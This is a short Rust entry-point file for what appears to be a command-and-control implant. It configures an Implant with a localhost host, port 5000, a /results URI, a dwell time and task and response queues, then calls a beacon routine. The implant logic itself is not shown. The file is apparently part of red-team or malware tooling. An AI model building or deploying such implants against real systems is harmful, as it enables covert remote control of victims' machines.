use tokio::time::Duration;
mod implant;
mod tasks;
#[tokio::main]
async fn main() {
    let host = String::from("localhost");
    let port = String::from("5000");
    let uri = String::from("/results");

    let mut implant = implant::Implant {
        host,
        port,
        uri,
        dwell: 1.0,
        is_running: true,
        tasks: Vec::new(),
        responses: Vec::new(),
    };

    implant.beacon().await;
}
